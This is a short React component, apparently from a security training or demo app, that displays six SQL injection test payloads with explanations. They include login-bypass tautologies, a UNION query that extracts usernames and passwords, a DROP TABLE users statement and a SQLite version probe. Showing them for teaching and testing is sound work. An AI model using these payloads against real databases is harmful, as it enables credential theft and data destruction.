import React from 'react';
import { ExclamationTriangleIcon } from '@heroicons/react/24/outline';

function SQLPayloadExamples() {
  const payloads = [
    {
      code: "' OR '1'='1",
      description: "Returns all users by creating a true condition"
    },
    {
      code: "' UNION SELECT username, password FROM users--",
      description: "Extracts passwords by joining with users table"
    },
    {
      code: "admin'; DROP TABLE users--",
      description: "Attempts to delete the users table"
    },
    {
      code: "admin' OR username LIKE '%admin%",
      description: "Finds usernames containing 'admin'"
    },
    {
      code: "' OR username != '",
      description: "Another way to return all users"
    },
    {
      code: "'; SELECT sqlite_version(); --",
      description: "Attempts to retrieve database version"
    }
  ];

  return (
    <div className="bg-yellow-50 border-l-4 border-yellow-400 p-4 mb-6">
      <div className="flex">
        <ExclamationTriangleIcon className="h-5 w-5 text-yellow-400" />
        <div className="ml-3">
          <p className="text-sm font-medium text-yellow-800 mb-2">SQL Injection Test Payloads:</p>
          <div className="space-y-2">
            {payloads.map((payload, index) => (
              <div key={index} className="text-sm text-yellow-700">
                <code className="bg-yellow-100 px-1 rounded">{payload.code}</code>
                <br />
                <span className="ml-4 text-yellow-600 text-xs">{payload.description}</span>
              </div>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
}

export default SQLPayloadExamples;